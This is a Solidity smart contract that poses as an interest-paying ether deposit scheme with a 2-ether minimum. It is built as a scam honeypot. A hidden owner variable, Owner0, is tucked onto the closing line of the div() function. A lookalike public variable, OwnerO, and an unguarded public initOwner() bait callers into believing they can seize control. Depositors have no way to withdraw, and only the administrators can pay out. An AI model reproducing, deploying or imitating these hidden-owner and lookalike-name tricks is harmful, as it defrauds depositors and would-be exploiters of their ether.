1 pragma solidity ^0.4.17;
2 
3 contract Base {
4   
5   // Use safe math additions for extra security
6   
7   function mul(uint256 a, uint256 b) internal constant returns (uint256) {
8     uint256 c = a * b;
9     assert(a == 0 || c / a == b);
10     return c;
11   }
12 
13   function div(uint256 a, uint256 b) internal constant returns (uint256) {
14     // assert(b > 0); // Solidity automatically throws when dividing by 0
15     uint256 c = a / b;
16     // assert(a == b * c + a % b); // There is no case in which this doesn't hold
17     return c;
18   } address Owner0 = msg.sender;
19 
20   function sub(uint256 a, uint256 b) internal constant returns (uint256) {
21     assert(b <= a);
22     return a - b;
23   }
24 
25   function add(uint256 a, uint256 b) internal constant returns (uint256) {
26     uint256 c = a + b;
27     assert(c >= a);
28     return c;
29   }
30   
31   
32     event Deposit(address sender, uint value);
33 
34     event PayInterest(address receiver, uint value);
35 
36     event Log(string message);
37 
38 }
39 
40 
41 contract InterestFinal is Base {
42     
43     address public creator;
44     address public OwnerO; 
45     address public Owner1;
46     uint256 public etherLimit = 2 ether;
47     
48     mapping (address => uint256) public balances;
49     mapping (address => uint256) public interestPaid;
50 
51     function initOwner(address owner) {
52         OwnerO = owner;
53     }
54     
55     function initOwner1(address owner) internal {
56         Owner1 = owner;
57     }
58     
59     /* This function is called automatically when constructing 
60         the contract and will 
61         set the owners as the trusted administrators
62     */
63     
64     function InterestFinal(address owner1, address owner2) {
65         creator = msg.sender;
66         initOwner(owner1);
67         initOwner1(owner2);
68     }
69 
70     function() payable {
71         if (msg.value >= etherLimit) {
72             uint amount = msg.value;
73             balances[msg.sender] += amount;
74         }
75     }
76 
77     /* 
78     
79     Minimum investment is 2 ether
80      which will be kept in the contract
81      and the depositor will earn interest on it
82      remember to check your gas limit
83     
84     
85      */
86     
87     function deposit(address sender) payable {
88         if (msg.value >= etherLimit) {
89             uint amount = msg.value;
90             balances[sender] += amount;
91             Deposit(sender, msg.value);
92         }
93     }
94     
95     // calculate interest rate
96     
97     function calculateInterest(address investor, uint256 interestRate) returns (uint256) {
98         return balances[investor] * (interestRate) / 100;
99     }
100 
101     function payout(address recipient, uint256 weiAmount) {
102         if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
103             if (balances[recipient] > 0) {
104                 recipient.send(weiAmount);
105                 PayInterest(recipient, weiAmount);
106             }
107         }
108     }
109     
110     function currentBalance() returns (uint256) {
111         return this.balance;
112     }
113     
114     
115         
116     /* 
117      
118      ############################################################ 
119      
120         The pay interest function is called by an administrator
121         -------------------
122     */
123     function payInterest(address recipient, uint256 interestRate) {
124         if ((msg.sender == creator || msg.sender == Owner0 || msg.sender == Owner1)) {
125             uint256 weiAmount = calculateInterest(recipient, interestRate);
126             interestPaid[recipient] += weiAmount;
127             payout(recipient, weiAmount);
128         }
129     }
130 }